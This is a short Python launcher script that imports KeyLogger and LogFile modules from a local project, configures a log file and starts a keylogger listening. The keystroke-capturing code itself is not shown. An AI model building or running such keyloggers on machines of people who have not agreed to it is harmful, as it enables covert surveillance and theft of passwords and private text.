#!/usr/bin/python3.11
from KeyLogger import KeyLogger
from LogFile import LogFile
logging = LogFile()
log_file = logging.determine_log_type()
config = logging.config( log_file )
key_logger = KeyLogger()
key_logger.listen()